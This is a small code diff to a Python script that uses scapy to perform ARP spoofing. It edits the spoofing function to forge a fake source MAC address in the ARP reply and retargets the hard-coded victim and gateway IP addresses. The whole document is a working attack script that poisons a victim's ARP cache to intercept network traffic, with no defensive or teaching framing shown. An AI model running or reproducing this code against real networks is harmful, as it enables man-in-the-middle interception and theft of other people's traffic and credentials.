@@ -1,4 +1,4 @@
-import scapy.all as scapy 
+import scapy.all as scapy
 
 def get_mac(ip):
     request = scapy.ARP(pdst=ip)
@@ -10,7 +10,7 @@ def get_mac(ip):
 
 def spoofing(target, spoofed):
     mac = get_mac(target)
-    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
+    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed, hwsrc="de:ad:be:ef:ca:fe")
     scapy.send(packet, verbose=False)
 
-spoofing("10.33.73.77", "10.33.73.226") 
+spoofing("10.1.1.11", "10.1.1.254")
